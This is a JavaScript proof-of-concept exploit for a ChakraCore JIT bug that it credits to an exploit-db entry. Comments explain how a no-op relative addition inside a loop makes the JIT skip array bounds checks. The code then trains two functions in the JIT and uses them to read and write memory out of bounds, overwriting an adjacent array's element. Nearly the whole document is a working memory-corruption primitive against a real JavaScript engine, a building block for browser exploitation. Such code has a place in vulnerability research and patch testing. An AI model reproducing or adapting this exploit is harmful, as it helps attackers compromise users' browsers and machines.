function hex(val, size=8) {
    return ('0'.repeat(size) + val.toString(16)).substr(-size);
}

function ReadUint64(view, offset) {
    const low = view.getUint32(offset, true);
    const high = view.getUint32(offset+4, true);
    return high * 0x100000000 + low;
}


/*
https://www.exploit-db.com/exploits/43718/
What happens here is as follows:
In the loop prepass analysis, (a) is a valid add operation. 
It's a relative operation to "i", so Chakra thinks it's a valid loop.

The variable "i" now becomes an induction variable, and a LoopCount object is created.
When the LoopCount object is created, the ValueInfo of "i" is IntBounded which contains
relative bounds information. 
In the actual optimization phase, (a) gets optimized and becomes a load operation 
which directly loads 10 to "i". It's no more relative operation, therefore the 
ValueInfo of "i" is not to be IntBounded. But the LoopCount object has already been 
created with the previous information. This leads Chakra to fail computing bounds 
which may result in OOB read/write.
*/

/*
There is a type confusion in the JIT code emitter such that the bounds check on the
array indexing variable is not emitted. This is due to the relative addition in line
(a) below.

It can be exploited to OOB read/write as implemented below. The intended way to use this
it by first jitting the 2 functions, and then calling them with the 'target' OOB index as
the 'start' argument with 'end' = 'target' + 1. 
*/

function optWrite(arr, start, end, val) {
    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        arr[i] = val;
    }
    return 0;
}

function optRead(arr, start, end) {
    let x;
    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        x = arr[i];
    }
    return x;
}


let arr = new Array(50);
let target = new Array(50);

arr.fill(1.1);
target.fill(2.2);

print("filled")
for (let i = 0; i < 1000; i++) {
    optWrite(arr, 0, 3, 5.40900888e-315);
}
for (let i = 0; i < 1000; i++) {
    optRead(arr, 0, 3);
}
print("opt");

for(let i = 51; i < 58; i++) {
    x = optRead(arr, 0, i);
    print("" + i + ": " + x);
}

print(target[0]);
let idx = 54;
optWrite(arr, idx, idx+1, 3.3);
print(target[0]);

for(let i = 51; i < 58; i++) {
    x = optRead(arr, 0, i);
    print("" + i + ": " + x);
}

